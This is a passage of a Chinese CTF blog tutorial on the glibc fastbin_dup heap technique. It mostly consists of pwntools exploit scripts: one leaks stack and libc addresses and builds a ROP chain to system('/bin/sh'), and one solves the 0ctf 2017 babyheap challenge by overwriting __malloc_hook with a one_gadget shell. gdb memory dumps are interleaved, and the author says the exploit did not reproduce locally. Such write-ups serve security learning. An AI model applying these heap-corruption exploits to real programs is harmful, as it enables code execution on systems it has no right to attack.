would put &apos;b&apos; at a location where it would not be guaranteed to be zero.</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # make our fake node</span><br><span class="line">    node = &apos;&apos;</span><br><span class="line">    node += p64(0x400E90) # word pointer &quot;Enter&quot;</span><br><span class="line">    node += p64(5) # word length</span><br><span class="line">    node += p64(0x602028) # sentence pointer (GOT address of free)</span><br><span class="line">    node += p64(64) # length of sentence</span><br><span class="line">    node += p64(0x00000000) # next pointer is null</span><br><span class="line">    assert len(node) == 40</span><br><span class="line"></span><br><span class="line">    # this sentence gets allocated on top of the previous sentence&apos;s node.</span><br><span class="line">    # we can thus control the sentence pointer of that node and leak memory.</span><br><span class="line">    index_sentence(node)</span><br><span class="line"></span><br><span class="line">    # this simply receives all input from the binary and discards it, which</span><br><span class="line">    # makes parsing out the leaked address easier below.</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    # leak the libc address</span><br><span class="line">    search(&apos;Enter&apos;)</span><br><span class="line">    p.recvuntil(&apos;Found 64: &apos;)</span><br><span class="line">    leak = u64(p.recvline()[:8])</span><br><span class="line">    p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary</span><br><span class="line">    return leak</span><br><span class="line"></span><br><span class="line">def index_sentence(s):</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def search(s):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def make_cycle():</span><br><span class="line">    index_sentence(&apos;a&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;b&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;c&apos;*54 + &apos; d&apos;)</span><br><span class="line"></span><br><span class="line">    search(&apos;d&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;n&apos;)</span><br><span class="line"></span><br><span class="line">def make_fake_chunk(addr):</span><br><span class="line">    # set the fwd pointer of the chunk to the address we want</span><br><span class="line">    fake_chunk = p64(addr)</span><br><span class="line">    index_sentence(fake_chunk.ljust(56))</span><br><span class="line"></span><br><span class="line">def allocate_fake_chunk(binsh_addr, system_addr):</span><br><span class="line">    # allocate twice to get our fake chunk</span><br><span class="line">    index_sentence(&apos;A&apos;*56)</span><br><span class="line">    index_sentence(&apos;B&apos;*56)</span><br><span class="line"></span><br><span class="line">    # overwrite the return address</span><br><span class="line">    buf = &apos;A&apos;*30</span><br><span class="line">    buf += p64(pop_rdi_ret)</span><br><span class="line">    buf += p64(binsh_addr)</span><br><span class="line">    buf += p64(system_addr)</span><br><span class="line">    buf = buf.ljust(56, &apos;C&apos;)</span><br><span class="line"></span><br><span class="line">    index_sentence(buf)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stack_leak = leak_stack()</span><br><span class="line"></span><br><span class="line">    # This makes stack_addr + 0x8 be 0x40  //在泄露的栈地址附近寻找0x40用于充当fakechunk的size</span><br><span class="line">    stack_addr = stack_leak + 0x5a - 8</span><br><span class="line"></span><br><span class="line">    log.info(&apos;stack leak: %s&apos; % hex(stack_leak))</span><br><span class="line">    log.info(&apos;stack addr: %s&apos; % hex(stack_addr))</span><br><span class="line"></span><br><span class="line">    libc_leak = leak_libc()</span><br><span class="line">    libc_base = libc_leak - puts_offset</span><br><span class="line">    system_addr = libc_base + system_offset</span><br><span class="line">    binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">    log.info(&apos;libc leak: %s&apos; % hex(libc_leak))</span><br><span class="line">    log.info(&apos;libc_base: %s&apos; % hex(libc_base))</span><br><span class="line">    log.info(&apos;system addr: %s&apos; % hex(system_addr))</span><br><span class="line">    log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">    make_cycle()</span><br><span class="line">    make_fake_chunk(stack_addr)</span><br><span class="line">    allocate_fake_chunk(binsh_addr, system_addr)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1 id="例题-0ctfbabyheap"><a href="#例题-0ctfbabyheap" class="headerlink" title="例题-0ctfbabyheap"></a>例题-0ctfbabyheap</h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><p>炒鸡正规的条件选项题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./0ctfbabyheap </span><br><span class="line">===== Baby Heap in 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure>
<p>分配的块可以分析出有一个结构体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">         struc_4  structure&#123; </span><br><span class="line">00000000 inuse          </span><br><span class="line">00000001 size         </span><br><span class="line">00000002 ptr           </span><br><span class="line">00000003 &#125;struc_4   ends</span><br></pre></td></tr></table></figure>
<p>inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址；</p>
<p>各个选项就不一一列举了，每个选项就如它名字一般：<br>allocate使用calloc分配块，最大4096；<br>fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；<br>free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。<br>dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。</p>
<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><em>即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。</em></p>
<p>目标：1.leak libc地址<br>      2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx  (long long)(&amp;main_arena)-0x30</span><br><span class="line">0x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;:	0x00007fa3a2004d60	0x0000000000000000</span><br><span class="line">0x7fa3a2008c20 &lt;__memalign_hook&gt;:	0x00007fa3a1ed4bf0	0x00007fa3a1ed5160</span><br><span class="line">0x7fa3a2008c30 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000  &lt;-- malloc hook </span><br><span class="line">0x7fa3a2008c40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fa3a2008c50 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fa3a2008c60 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fa3a2008c70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fa3a2008c80 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fa3a2008c90 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fa3a2008ca0 &lt;main_arena+96&gt;:	0x000055b863881360	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p><em>经过不断的调试，确信本机无法复现成功，因为一块0x10大小的内存被free掉以后，再次alloc本应在free掉的地址处，但是本机却会新开辟一块地方。。所以没救了:(</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"> </span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"> </span><br><span class="line">elf = &quot;./0ctfbabyheap&quot;</span><br><span class="line">ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;</span><br><span class="line"> </span><br><span class="line">p = process(elf)</span><br><span class="line"> </span><br><span class="line">def alloc(size):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;Size: &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"> </span><br><span class="line">def fill(idx, content):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;Size: &quot;)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    p.send(content)</span><br><span class="line"> </span><br><span class="line">def free(idx):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line">def dump(idx):</span><br><span class="line">    p.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index: &quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvline()</span><br><span class="line">    return p.recvline()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line"> </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line"> </span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#main arena and heap </span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">gdb-peda$ x/20gx &amp;main_arena</span><br><span class="line">0x7f6dd27f3c40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000 //there is no fastbin[0],don&apos;t know why...</span><br><span class="line">0x7f6dd27f3c50 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6dd27f3c60 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6dd27f3c70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6dd27f3c80 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6dd27f3c90 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6dd27f3ca0 &lt;main_arena+96&gt;:	0x000056122eed1360	0x0000000000000000</span><br><span class="line">0x7f6dd27f3cb0 &lt;main_arena+112&gt;:	0x00007f6dd27f3ca0	0x00007f6dd27f3ca0</span><br><span class="line">0x7f6dd27f3cc0 &lt;main_arena+128&gt;:	0x00007f6dd27f3cb0	0x00007f6dd27f3cb0</span><br><span class="line">0x7f6dd27f3cd0 &lt;main_arena+144&gt;:	0x00007f6dd27f3cc0	0x00007f6dd27f3cc0</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/30gx 0x000056122eed1250</span><br><span class="line">0x56122eed1250:	0x0000000000000000	0x0000000000000021   chunk 0,in use</span><br><span class="line">0x56122eed1260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56122eed1270:	0x0000000000000000	0x0000000000000021   chunk 1,free</span><br><span class="line">0x56122eed1280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56122eed1290:	0x0000000000000000	0x0000000000000021   chunk 2,free</span><br><span class="line">0x56122eed12a0:	0x000056122eed1280  &lt;-- chunk 2&apos;s fd pointer,point to chunk 1 0x0000000000000000</span><br><span class="line">0x56122eed12b0:	0x0000000000000000	0x0000000000000021   chunk 3,in use</span><br><span class="line">0x56122eed12c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56122eed12d0:	0x0000000000000000	0x0000000000000091   chunk 4,in use</span><br><span class="line">0x56122eed12e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56122eed12f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56122eed1300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56122eed1310:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56122eed1320:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56122eed1330:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line"></span><br><span class="line">payload = p64(0)*3</span><br><span class="line">payload += p64(0x21)</span><br><span class="line">payload += p64(0)*3</span><br><span class="line">payload += p64(0x21)</span><br><span class="line">payload += p8(0xd0)</span><br><span class="line">fill(0, payload)</span><br><span class="line"> </span><br><span class="line">payload = p64(0)*3</span><br><span class="line">payload += p64(0x21)</span><br><span class="line">fill(3, payload)</span><br><span class="line"> </span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">gdb-peda$ x/30gx 0x000055b863881250</span><br><span class="line">0x55b863881250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b863881260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b863881270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b863881280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b863881290:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b8638812a0:	0x000055b8638812d0 -|  0x0000000000000000 &lt;--chunk 2&apos;s fd pointer point to chunk 4</span><br><span class="line">0x55b8638812b0:	0x0000000000000000	|  0x0000000000000021</span><br><span class="line">0x55b8638812c0:	0x0000000000000000	|  0x0000000000000000</span><br><span class="line">0x55b8638812d0:	0x0000000000000000 &lt;-  0x0000000000000021 &lt;-- 0x91 was changed to 0x21 by filling chunk 3 for cheating </span><br><span class="line">0x55b8638812e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b8638812f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b863881300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b863881310:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b863881320:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b863881330:	0x0000000000000000	0x0000000000000000</span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line"></span><br><span class="line">alloc(0x10)   //chunk 2&apos;s address but its index is 1 </span><br><span class="line">alloc(0x10)   //chunk 4&apos;s address but its index is 2</span><br><span class="line"></span><br><span class="line">payload = p64(0)*3</span><br><span class="line">payload += p64(0x91)</span><br><span class="line">fill(3, payload)  // change  back</span><br><span class="line">alloc(0x80)       //chunk 5</span><br><span class="line">free(4)           </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x195c98   //0x58 +(0x7fc47fa61c40 - 0x7fc47f8cc000 ) </span><br><span class="line">log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br><span class="line"> </span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">gdb-peda$ p main_arena</span><br><span class="line">$1 = &#123;</span><br><span class="line">  mutex = 0x0, </span><br><span class="line">  flags = 0x0, </span><br><span class="line">  have_fastchunks = 0x0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 0x55dcc4edc430, </span><br><span class="line">  last_remainder = 0x0, </span><br><span class="line">  bins = &#123;...&#125;</span><br><span class="line">  binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  next = 0x7fc47fa61c40 &lt;main_arena&gt;, &lt;------------## main_arena address </span><br><span class="line">  next_free = 0x0, </span><br><span class="line">  attached_threads = 0x1, </span><br><span class="line">  system_mem = 0x21000, </span><br><span class="line">  max_system_mem = 0x21000</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x00003b8f7c613000 0x00003b8f7c614000 rw-p	mapped</span><br><span class="line">0x000055dcc365b000 0x000055dcc365d000 r-xp	/root/heap/0ctfbabyheap</span><br><span class="line">0x000055dcc385c000 0x000055dcc385d000 r--p	/root/heap/0ctfbabyheap</span><br><span class="line">0x000055dcc385d000 0x000055dcc385e000 rw-p	/root/heap/0ctfbabyheap</span><br><span class="line">0x000055dcc4edc000 0x000055dcc4efd000 rw-p	[heap]</span><br><span class="line">0x00007fc47f8aa000 0x00007fc47f8cc000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.27.so   // I don&apos;t really know what address we need.</span><br><span class="line">0x00007fc47f8cc000 0x00007fc47fa12000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">0x00007fc47fa12000 0x00007fc47fa5d000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">0x00007fc47fa5d000 0x00007fc47fa61000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">0x00007fc47fa61000 0x00007fc47fa63000 rw-p	/usr/lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">0x00007fc47fa63000 0x00007fc47fa67000 rw-p	mapped</span><br><span class="line">0x00007fc47fa67000 0x00007fc47fa69000 rw-p	mapped</span><br><span class="line">0x00007fc47fa8a000 0x00007fc47fa8b000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47fa8b000 0x00007fc47faa9000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47faa9000 0x00007fc47fab1000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47fab1000 0x00007fc47fab2000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47fab2000 0x00007fc47fab3000 rw-p	/usr/lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">0x00007fc47fab3000 0x00007fc47fab4000 rw-p	mapped</span><br><span class="line">0x00007ffd42afd000 0x00007ffd42b1e000 rw-p	[stack]</span><br><span class="line">0x00007ffd42bee000 0x00007ffd42bf1000 r--p	[vvar]</span><br><span class="line">0x00007ffd42bf1000 0x00007ffd42bf3000 r-xp	[vdso]</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line"> </span><br><span class="line">payload = p64(libc_base+0x3c4aed)      //malloc_hook&apos;s 0x000000007f address - 0x8 </span><br><span class="line">fill(2, payload)</span><br><span class="line"> </span><br><span class="line">alloc(0x60)</span><br><span class="line">alloc(0x60)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload = p8(0)*3                    //using offset wisely make 0x7f***** as fake size &apos;0x000000007f&apos;</span><br><span class="line">payload += p64(0)*2</span><br><span class="line">payload += p64(libc_base+0x4345e)    //tools called &apos;one_gadget&apos; can help get execv(&apos;/bin/sh&apos;) directly;</span><br><span class="line">fill(6, payload)</span><br><span class="line"> </span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">root@kali:~/heap# ldd ./0ctfbabyheap </span><br><span class="line">	linux-vdso.so.1 (0x00007ffd59ff6000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007faf4646f000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007faf46852000)</span><br><span class="line">	</span><br><span class="line">root@kali:~/heap# one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x4345e	execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x434b2	execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xe42ee	execve(&quot;/bin/sh&quot;, rsp+0x60, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x60] == NULL</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------#</span><br><span class="line">alloc(255)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>reference:<br><a href="https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1</a><br><a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p>
<p><em>没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。</em></p>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最後更新時間：<time datetime="2018-10-18T08:38:54.171Z" itemprop="dateUpdated">2018-10-18 16:38:54</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2018/10/15/introduction-to-pwn2-1-fastbin-dup/" target="_blank" rel="external">http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/</a>
        
    </div>
    <footer>
        <a href="http://siriuswhiter.tk">
            <img src="/img/avatar.jpg" alt="Sirius Whiter">
            Sirius Whiter
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/&title=《Introduction to pwn2.1-fastbin_dup》 — Room of Equirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/&title=《Introduction to pwn2.1-fastbin_dup》 — Room of Equirement&source=pwn菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Introduction to pwn2.2-fastbin_dup_consolidate</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2018/10/08/diary-20181008/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Diary.20181008</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
